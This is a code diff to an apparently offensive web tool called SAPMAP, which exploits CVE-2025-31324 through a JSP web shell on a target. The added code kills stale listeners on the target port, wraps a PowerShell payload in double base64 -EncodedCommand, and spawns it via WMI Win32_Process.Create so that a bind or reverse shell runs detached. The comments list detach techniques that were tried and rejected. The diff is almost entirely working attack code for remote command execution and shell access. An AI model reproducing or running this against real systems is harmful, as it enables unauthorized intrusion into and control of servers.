@@ -2056,25 +2056,56 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 # timeout.
                 raw_ps = payload.get("raw_ps_script")
                 if raw_ps:
+                    # Kill any zombie PowerShell still LISTENING on the
+                    # target port from a previous bind-shell attempt,
+                    # otherwise the new listener hits "socket address
+                    # already in use" and the user ends up talking to the
+                    # old process on reconnect.
+                    if shell_mode == "bind":
+                        _set_progress(
+                            "Clearing any old listener on target port...")
+                        kill_cmd = (
+                            f'cmd.exe /C for /f "tokens=5" %P in '
+                            f'(\'netstat -ano ^| findstr :{shell_port} '
+                            f'^| findstr LISTENING\') do '
+                            f'taskkill /F /PID %P >nul 2>&1'
+                        )
+                        try:
+                            sapmap_exploit.execute_cve_2025_31324_via_shell(
+                                node, kill_cmd, timeout=15.0)
+                        except Exception:
+                            pass   # best-effort cleanup
+
                     _set_progress("Executing payload (single-shot)...")
-                    # Encode the PowerShell source as UTF-16LE base64 and
-                    # hand it to `-EncodedCommand` — this bypasses all
-                    # quote/escape parsing by cmd.exe and PowerShell alike,
-                    # which matters because the reverse/bind shell scripts
-                    # contain embedded single AND double quotes.
+                    # Clean-detach pattern: spawn the bind/reverse shell
+                    # PowerShell via WMI Win32_Process.Create from a wrapper
+                    # PowerShell — the spawned process inherits no handles
+                    # from the JSP shell's cmd.exe, so no stdio leaks back
+                    # as CLIXML progress/error noise and the wrapper exits
+                    # instantly.
                     #
-                    # `start /B` detaches the PowerShell process so the JSP
-                    # shell's Runtime.exec(cmd.exe /c ...) can exit and
-                    # return the HTTP response immediately, freeing up
-                    # shell_start to call start_connector (bind mode) or
-                    # accept the reverse connection on the listener.
+                    # Tried and rejected:
+                    #   - `start /B powershell ...`: inherits stdio, leaks
+                    #     CLIXML back through the JSP.
+                    #   - `start "" /B cmd /c "... >nul 2>&1"`: quote
+                    #     parsing mangles the nested cmd and the detach
+                    #     silently fails ("system cannot find the path").
+                    #
+                    # -EncodedCommand on both layers bypasses quote parsing
+                    # entirely for the payload itself.
                     import base64 as _b64
-                    enc = _b64.b64encode(
+                    inner_enc = _b64.b64encode(
                         raw_ps.encode("utf-16-le")).decode("ascii")
-                    full_cmd = (f"start /B powershell.exe -NoProfile "
-                                f"-EncodedCommand {enc}")
-                    # 45s is generous — the command returns as soon as
-                    # `start` spawns the detached child, typically <1s.
+                    wrapper_ps = (
+                        f'[void]([wmiclass]"Win32_Process").Create('
+                        f'"powershell.exe -NoProfile '
+                        f'-EncodedCommand {inner_enc}")'
+                    )
+                    outer_enc = _b64.b64encode(
+                        wrapper_ps.encode("utf-16-le")).decode("ascii")
+                    full_cmd = (f"powershell.exe -NoProfile "
+                                f"-EncodedCommand {outer_enc}")
+                    # 45s is generous — wrapper typically returns <1s.
                     result = sapmap_exploit.execute_cve_2025_31324_via_shell(
                         node, full_cmd, timeout=45.0)
                 else:
